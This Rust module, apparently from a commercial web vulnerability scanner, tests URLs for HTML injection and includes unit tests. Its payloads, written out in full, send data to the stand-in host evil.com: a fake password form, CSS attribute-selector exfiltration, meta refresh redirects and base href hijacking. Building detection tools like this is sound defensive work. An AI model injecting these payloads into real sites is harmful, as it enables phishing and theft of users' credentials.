// Copyright (c) 2026 Bountyy Oy. All rights reserved.
// This software is proprietary and confidential.

use crate::http_client::HttpClient;
use crate::types::{Confidence, ScanConfig, Severity, Vulnerability};
use std::sync::Arc;
use tracing::{debug, info};

pub struct HtmlInjectionScanner {
    http_client: Arc<HttpClient>,
    test_marker: String,
}

impl HtmlInjectionScanner {
    pub fn new(http_client: Arc<HttpClient>) -> Self {
        // Generate unique test marker
        let test_marker = format!("html_{}", uuid::Uuid::new_v4().to_string().replace("-", ""));
        Self {
            http_client,
            test_marker,
        }
    }

    /// Scan endpoint for HTML injection vulnerabilities
    pub async fn scan(
        &self,
        url: &str,
        _config: &ScanConfig,
    ) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        info!("Testing HTML injection vulnerabilities");

        // Test content injection
        let (vulns, tests) = self.test_content_injection(url).await?;
        vulnerabilities.extend(vulns);
        tests_run += tests;

        // Test meta tag injection if no critical vulns found
        if vulnerabilities.is_empty() || vulnerabilities.iter().all(|v| v.severity != Severity::Critical) {
            let (vulns, tests) = self.test_meta_tag_injection(url).await?;
            vulnerabilities.extend(vulns);
            tests_run += tests;
        }

        // Test link manipulation
        if vulnerabilities.is_empty() || vulnerabilities.iter().all(|v| v.severity != Severity::Critical) {
            let (vulns, tests) = self.test_link_manipulation(url).await?;
            vulnerabilities.extend(vulns);
            tests_run += tests;
        }

        // Test form injection
        if vulnerabilities.is_empty() || vulnerabilities.iter().all(|v| v.severity != Severity::Critical) {
            let (vulns, tests) = self.test_form_injection(url).await?;
            vulnerabilities.extend(vulns);
            tests_run += tests;
        }

        // Test media injection
        if vulnerabilities.is_empty() || vulnerabilities.iter().all(|v| v.severity != Severity::Critical) {
            let (vulns, tests) = self.test_media_injection(url).await?;
            vulnerabilities.extend(vulns);
            tests_run += tests;
        }

        // Test style injection
        if vulnerabilities.is_empty() || vulnerabilities.iter().all(|v| v.severity != Severity::Critical) {
            let (vulns, tests) = self.test_style_injection(url).await?;
            vulnerabilities.extend(vulns);
            tests_run += tests;
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Test content injection (h1, marquee, iframe)
    async fn test_content_injection(&self, url: &str) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let tests_run = 3;

        debug!("Testing content injection");

        let payloads = vec![
            format!("<h1>Injected_{}</h1>", self.test_marker),
            format!("<marquee>marquee_{}</marquee>", self.test_marker),
            format!(r#"<iframe src="https://evil.com/track?id={}"></iframe>"#, self.test_marker),
        ];

        for payload in payloads {
            let test_url = if url.contains('?') {
                format!("{}&test={}", url, urlencoding::encode(&payload))
            } else {
                format!("{}?test={}", url, urlencoding::encode(&payload))
            };

            match self.http_client.get(&test_url).await {
                Ok(response) => {
                    // Check if HTML was injected (not encoded)
                    if self.detect_html_injection(&response.body, &payload) {
                        info!("Content injection detected");

                        let severity = if payload.contains("<iframe") {
                            Severity::High
                        } else {
                            Severity::Medium
                        };

                        vulnerabilities.push(self.create_vulnerability(
                            url,
                            "Content Injection",
                            &payload,
                            "HTML content injection detected",
                            &format!("Injected HTML marker '{}' rendered without encoding", self.test_marker),
                            severity,
                        ));
                        break;
                    }
                }
                Err(e) => {
                    debug!("Request failed: {}", e);
                }
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Test meta tag injection
    async fn test_meta_tag_injection(&self, url: &str) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let tests_run = 4;

        debug!("Testing meta tag injection");

        let payloads = vec![
            // Meta refresh redirect (critical - open redirect)
            r#"<meta http-equiv="refresh" content="0;url=https://evil.com">"#.to_string(),
            // Base href (critical - changes ALL relative URLs)
            format!(r#"<base href="https://evil.com/{}/">"#, self.test_marker),
            // Meta description (SEO poisoning)
            format!(r#"<meta name="description" content="Injected_{}">"#, self.test_marker),
            // Open Graph image (tracking)
            format!(r#"<meta property="og:image" content="https://evil.com/track.png?id={}">"#, self.test_marker),
        ];

        for payload in payloads {
            let test_url = if url.contains('?') {
                format!("{}&test={}", url, urlencoding::encode(&payload))
            } else {
                format!("{}?test={}", url, urlencoding::encode(&payload))
            };

            match self.http_client.get(&test_url).await {
                Ok(response) => {
                    if self.detect_html_injection(&response.body, &payload) {
                        info!("Meta tag injection detected");

                        let severity = if payload.contains("http-equiv=\"refresh\"") || payload.contains("<base") {
                            Severity::Critical
                        } else {
                            Severity::Medium
                        };

                        vulnerabilities.push(self.create_vulnerability(
                            url,
                            "Meta Tag Injection",
                            &payload,
                            if severity == Severity::Critical {
                                "Critical meta tag injection - redirect or base href manipulation"
                            } else {
                                "Meta tag injection - SEO poisoning or tracking"
                            },
                            &format!("Injected meta tag with marker '{}' rendered in page", self.test_marker),
                            severity,
                        ));
                        break;
                    }
                }
                Err(e) => {
                    debug!("Request failed: {}", e);
                }
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Test link manipulation
    async fn test_link_manipulation(&self, url: &str) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let tests_run = 3;

        debug!("Testing link manipulation");

        let payloads = vec![
            // Phishing link
            format!(r#"<a href="https://evil.com/phish?id={}">Click here</a>"#, self.test_marker),
            // CSS stylesheet link (data exfiltration via CSS)
            format!(r#"<link rel="stylesheet" href="https://evil.com/steal.css?id={}">"#, self.test_marker),
            // Prefetch link (force browser to load external resource)
            format!(r#"<link rel="prefetch" href="https://evil.com/track?id={}">"#, self.test_marker),
        ];

        for payload in payloads {
            let test_url = if url.contains('?') {
                format!("{}&test={}", url, urlencoding::encode(&payload))
            } else {
                format!("{}?test={}", url, urlencoding::encode(&payload))
            };

            match self.http_client.get(&test_url).await {
                Ok(response) => {
                    if self.detect_html_injection(&response.body, &payload) {
                        info!("Link manipulation detected");

                        let severity = if payload.contains(r#"rel="stylesheet"#) {
                            Severity::High
                        } else {
                            Severity::Medium
                        };

                        vulnerabilities.push(self.create_vulnerability(
                            url,
                            "Link Manipulation",
                            &payload,
                            if severity == Severity::High {
                                "Link injection with CSS stylesheet - data exfiltration risk"
                            } else {
                                "Link injection - phishing risk"
                            },
                            &format!("Injected link with marker '{}' rendered in page", self.test_marker),
                            severity,
                        ));
                        break;
                    }
                }
                Err(e) => {
                    debug!("Request failed: {}", e);
                }
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Test form injection
    async fn test_form_injection(&self, url: &str) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let tests_run = 2;

        debug!("Testing form injection");

        let payloads = vec![
            // Fake login form (credential phishing)
            format!(
                r#"<form action="https://evil.com/steal?id={}" method="POST">
<input name="password" type="password" placeholder="Enter password">
<input type="submit" value="Login">
</form>"#,
                self.test_marker
            ),
            // Form with hidden field
            format!(
                r#"<form action="https://evil.com/steal?id={}" method="POST">
<input type="hidden" name="token" value="injected_{}">
<input type="submit" value="Continue">
</form>"#,
                self.test_marker,
                self.test_marker
            ),
        ];

        for payload in payloads {
            let test_url = if url.contains('?') {
                format!("{}&test={}", url, urlencoding::encode(&payload))
            } else {
                format!("{}?test={}", url, urlencoding::encode(&payload))
            };

            match self.http_client.get(&test_url).await {
                Ok(response) => {
                    if self.detect_html_injection(&response.body, &payload) {
                        info!("Form injection detected");
                        vulnerabilities.push(self.create_vulnerability(
                            url,
                            "Form Injection",
                            &payload,
                            "Form injection - credential phishing risk",
                            &format!("Injected form with marker '{}' rendered in page", self.test_marker),
                            Severity::Critical,
                        ));
                        break;
                    }
                }
                Err(e) => {
                    debug!("Request failed: {}", e);
                }
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Test media injection (img, video, audio)
    async fn test_media_injection(&self, url: &str) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let tests_run = 3;

        debug!("Testing media injection");

        let payloads = vec![
            // Image with tracking
            format!(r#"<img src="https://evil.com/track.png?user={}">"#, self.test_marker),
            // Video element
            format!(r#"<video src="https://evil.com/video.mp4?id={}"></video>"#, self.test_marker),
            // Audio element
            format!(r#"<audio src="https://evil.com/track.ogg?id={}"></audio>"#, self.test_marker),
        ];

        for payload in payloads {
            let test_url = if url.contains('?') {
                format!("{}&test={}", url, urlencoding::encode(&payload))
            } else {
                format!("{}?test={}", url, urlencoding::encode(&payload))
            };

            match self.http_client.get(&test_url).await {
                Ok(response) => {
                    if self.detect_html_injection(&response.body, &payload) {
                        info!("Media injection detected");
                        vulnerabilities.push(self.create_vulnerability(
                            url,
                            "Media Injection",
                            &payload,
                            "Media element injection - tracking and SSRF risk",
                            &format!("Injected media element with marker '{}' rendered in page", self.test_marker),
                            Severity::Medium,
                        ));
                        break;
                    }
                }
                Err(e) => {
                    debug!("Request failed: {}", e);
                }
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Test style injection
    async fn test_style_injection(&self, url: &str) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let tests_run = 3;

        debug!("Testing style injection");

        let payloads = vec![
            // CSS with background image (data exfiltration)
            format!(r#"<style>body{{background:url(https://evil.com/bg.png?data={})}}</style>"#, self.test_marker),
            // CSS clickjacking
            format!(r#"<style>.login-button{{opacity:0;position:absolute;z-index:-1}}/*{}*/</style>"#, self.test_marker),
            // CSS attribute selector exfiltration
            format!(
                r#"<style>input[value^="a"]{{background:url(https://evil.com/a?id={})}}/*{}*/</style>"#,
                self.test_marker,
                self.test_marker
            ),
        ];

        for payload in payloads {
            let test_url = if url.contains('?') {
                format!("{}&test={}", url, urlencoding::encode(&payload))
            } else {
                format!("{}?test={}", url, urlencoding::encode(&payload))
            };

            match self.http_client.get(&test_url).await {
                Ok(response) => {
                    if self.detect_html_injection(&response.body, &payload) {
                        info!("Style injection detected");

                        let severity = if payload.contains("background:url") {
                            Severity::Medium
                        } else {
                            Severity::Medium
                        };

                        vulnerabilities.push(self.create_vulnerability(
                            url,
                            "Style Injection",
                            &payload,
                            "CSS injection - data exfiltration or UI manipulation risk",
                            &format!("Injected style tag with marker '{}' rendered in page", self.test_marker),
                            severity,
                        ));
                        break;
                    }
                }
                Err(e) => {
                    debug!("Request failed: {}", e);
                }
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Detect HTML injection in response
    ///
    /// This function checks if injected HTML was rendered without encoding:
    /// 1. Unique marker appears in response
    /// 2. HTML tags appear unencoded (not &lt; or &gt;)
    /// 3. Tag structure is preserved
    ///
    /// FALSE POSITIVES TO AVOID:
    /// - Encoded HTML entities (&lt;h1&gt; instead of <h1>)
    /// - Marker appears but tags are stripped
    /// - Response reflects input but encodes it safely
    fn detect_html_injection(&self, body: &str, payload: &str) -> bool {
        // Primary check: Marker must be present
        if !body.contains(&self.test_marker) {
            return false;
        }

        // Extract key tag from payload (first tag)
        let key_tag = if let Some(start) = payload.find('<') {
            if let Some(end) = payload[start..].find('>') {
                &payload[start..start + end + 1]
            } else {
                return false;
            }
        } else {
            return false;
        };

        // Check if tag appears unencoded
        // Real injection: <h1> appears as-is
        // Encoded (safe): &lt;h1&gt; appears
        if body.contains(key_tag) {
            // Double-check it's not HTML entity encoded
            let encoded_tag = key_tag
                .replace('<', "&lt;")
                .replace('>', "&gt;");

            // If we find the encoded version, it's NOT a vulnerability
            if body.contains(&encoded_tag) {
                return false;
            }

            // Tag appears unencoded - this is HTML injection
            return true;
        }

        // Check for partial injection (tag structure preserved but modified)
        // For example: <h1>content</h1> might appear as <h1 class="user">content</h1>
        let tag_name = if let Some(space_idx) = key_tag.find(' ') {
            &key_tag[1..space_idx]
        } else if let Some(gt_idx) = key_tag.find('>') {
            &key_tag[1..gt_idx]
        } else {
            return false;
        };

        // Check if opening tag with our tag name appears
        let opening_pattern = format!("<{}", tag_name);
        if body.contains(&opening_pattern) && body.contains(&self.test_marker) {
            // Verify not encoded
            let encoded_pattern = format!("&lt;{}", tag_name);
            if !body.contains(&encoded_pattern) {
                return true;
            }
        }

        false
    }

    /// Create a vulnerability record
    fn create_vulnerability(
        &self,
        url: &str,
        attack_type: &str,
        payload: &str,
        description: &str,
        evidence: &str,
        severity: Severity,
    ) -> Vulnerability {
        let cvss = match severity {
            Severity::Critical => 8.6,
            Severity::High => 7.5,
            Severity::Medium => 5.3,
            Severity::Low => 3.1,
            _ => 2.0,
        };

        Vulnerability {
            id: format!("html_inj_{}", uuid::Uuid::new_v4().to_string()),
            vuln_type: format!("HTML Injection ({})", attack_type),
            severity,
            confidence: Confidence::High,
            category: "Injection".to_string(),
            url: url.to_string(),
            parameter: Some("test".to_string()),
            payload: payload.to_string(),
            description: description.to_string(),
            evidence: Some(evidence.to_string()),
            cwe: "CWE-79".to_string(), // Improper Neutralization of Input During Web Page Generation
            cvss: cvss as f32,
            verified: true,
            false_positive: false,
            remediation: "1. Encode all user input before rendering in HTML context\n\
                         2. Use context-aware output encoding (HTML entity encoding for HTML context)\n\
                         3. Implement Content Security Policy (CSP) to restrict external resources\n\
                         4. Validate and sanitize all user input with allowlists\n\
                         5. Use template engines with auto-escaping enabled\n\
                         6. Never allow raw HTML input from untrusted sources\n\
                         7. Implement input validation to reject HTML tags\n\
                         8. Use X-Content-Type-Options: nosniff header\n\
                         9. For rich text, use a trusted HTML sanitizer library\n\
                         10. Apply defense in depth: encode, validate, and use CSP".to_string(),
            discovered_at: chrono::Utc::now().to_rfc3339(),
                ml_data: None,
        }
    }
}

// UUID generation helper
mod uuid {
    use rand::Rng;

    pub struct Uuid;

    impl Uuid {
        pub fn new_v4() -> Self {
            Uuid
        }

        pub fn to_string(&self) -> String {
            let mut rng = rand::rng();
            format!(
                "{:08x}{:04x}{:04x}{:04x}{:012x}",
                rng.random::<u32>(),
                rng.random::<u16>(),
                rng.random::<u16>(),
                rng.random::<u16>(),
                rng.random::<u64>() & 0xffffffffffff
            )
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::detection_helpers::AppCharacteristics;
use crate::http_client::HttpClient;
    use std::sync::Arc;

    fn create_test_scanner() -> HtmlInjectionScanner {
        let http_client = Arc::new(HttpClient::new(30, 3).unwrap());
        HtmlInjectionScanner::new(http_client)
    }

    #[test]
    fn test_detect_html_injection_unencoded() {
        let scanner = create_test_scanner();
        let payload = format!("<h1>Test_{}</h1>", scanner.test_marker);
        let body = format!("Response: {}", payload);

        assert!(scanner.detect_html_injection(&body, &payload));
    }

    #[test]
    fn test_detect_html_injection_encoded() {
        let scanner = create_test_scanner();
        let payload = format!("<h1>Test_{}</h1>", scanner.test_marker);
        let body = format!("Response: &lt;h1&gt;Test_{}&lt;/h1&gt;", scanner.test_marker);

        assert!(!scanner.detect_html_injection(&body, &payload));
    }

    #[test]
    fn test_detect_html_injection_marker_only() {
        let scanner = create_test_scanner();
        let payload = format!("<h1>Test_{}</h1>", scanner.test_marker);
        let body = format!("Response: Test_{}", scanner.test_marker);

        assert!(!scanner.detect_html_injection(&body, &payload));
    }

    #[test]
    fn test_detect_meta_tag_injection() {
        let scanner = create_test_scanner();
        let payload = format!(r#"<meta name="test" content="{}">"#, scanner.test_marker);
        let body = format!(r#"<head>{}</head>"#, payload);

        assert!(scanner.detect_html_injection(&body, &payload));
    }

    #[test]
    fn test_detect_form_injection() {
        let scanner = create_test_scanner();
        let payload = format!(
            r#"<form action="https://evil.com?id={}" method="POST"></form>"#,
            scanner.test_marker
        );
        let body = format!("Content: {}", payload);

        assert!(scanner.detect_html_injection(&body, &payload));
    }

    #[test]
    fn test_detect_style_injection() {
        let scanner = create_test_scanner();
        let payload = format!(r#"<style>body{{background:red}}/*{}*/</style>"#, scanner.test_marker);
        let body = format!("HTML: {}", payload);

        assert!(scanner.detect_html_injection(&body, &payload));
    }

    #[test]
    fn test_no_false_positive_on_safe_reflection() {
        let scanner = create_test_scanner();
        let payload = format!("<script>alert('{}')</script>", scanner.test_marker);

        // Safely encoded response
        let body = format!(
            "You searched for: &lt;script&gt;alert('{}')&lt;/script&gt;",
            scanner.test_marker
        );

        assert!(!scanner.detect_html_injection(&body, &payload));
    }

    #[test]
    fn test_detect_iframe_injection() {
        let scanner = create_test_scanner();
        let payload = format!(r#"<iframe src="https://evil.com?id={}"></iframe>"#, scanner.test_marker);
        let body = format!("Content: {}", payload);

        assert!(scanner.detect_html_injection(&body, &payload));
    }

    #[test]
    fn test_create_vulnerability_severities() {
        let scanner = create_test_scanner();

        // Critical: Form injection
        let vuln_critical = scanner.create_vulnerability(
            "http://example.com",
            "Form Injection",
            "<form>test</form>",
            "Form injection",
            "Evidence",
            Severity::Critical,
        );
        assert_eq!(vuln_critical.severity, Severity::Critical);
        assert_eq!(vuln_critical.cvss, 8.6);

        // High: Link manipulation
        let vuln_high = scanner.create_vulnerability(
            "http://example.com",
            "Link Manipulation",
            "<a>test</a>",
            "Link injection",
            "Evidence",
            Severity::High,
        );
        assert_eq!(vuln_high.severity, Severity::High);
        assert_eq!(vuln_high.cvss, 7.5);

        // Medium: Content injection
        let vuln_medium = scanner.create_vulnerability(
            "http://example.com",
            "Content Injection",
            "<h1>test</h1>",
            "Content injection",
            "Evidence",
            Severity::Medium,
        );
        assert_eq!(vuln_medium.severity, Severity::Medium);
        assert_eq!(vuln_medium.cvss, 5.3);
    }

    #[test]
    fn test_unique_test_marker() {
        let scanner1 = create_test_scanner();
        let scanner2 = create_test_scanner();

        // Each scanner should have a unique marker
        assert_ne!(scanner1.test_marker, scanner2.test_marker);
        assert!(scanner1.test_marker.starts_with("html_"));
    }

    #[test]
    fn test_detect_base_href_injection() {
        let scanner = create_test_scanner();
        let payload = format!(r#"<base href="https://evil.com/{}/">"#, scanner.test_marker);
        let body = format!(r#"<head>{}</head>"#, payload);

        assert!(scanner.detect_html_injection(&body, &payload));
    }

    #[test]
    fn test_detect_partial_tag_injection() {
        let scanner = create_test_scanner();
        let payload = format!("<h1>Test_{}</h1>", scanner.test_marker);

        // Response modified the tag but kept structure
        let body = format!(r#"<h1 class="user">Test_{}</h1>"#, scanner.test_marker);

        assert!(scanner.detect_html_injection(&body, &payload));
    }

    #[test]
    fn test_no_detection_without_marker() {
        let scanner = create_test_scanner();
        let payload = format!("<h1>Test_{}</h1>", scanner.test_marker);
        let body = "<h1>Different content</h1>".to_string();

        assert!(!scanner.detect_html_injection(&body, &payload));
    }
}
